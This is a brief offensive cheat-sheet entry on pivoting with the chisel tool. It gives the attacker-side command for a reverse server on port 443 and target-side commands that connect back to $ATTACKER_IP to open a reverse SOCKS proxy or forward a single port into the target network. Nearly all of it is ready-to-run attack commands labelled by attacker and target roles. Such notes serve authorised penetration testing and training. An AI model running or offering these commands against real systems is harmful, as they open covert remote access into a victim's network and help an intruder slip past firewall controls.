# tunneling through chisel - socks
Tunnel through 443 and open a socks proxy on attacker localhost.
## Attacker
```bash
./chisel server --port 443 --reverse
```
## Target
```
./chisel client $ATTACKER_IP:443 R:socks
```
## Forward specific port
Forward port 1234 on attacker host to 127.0.0.1:1234 on target.
The client specifies the ports.
```
./chisel client $ATTACKER_IP:443 R:1234:127.0.0.1:1234
```
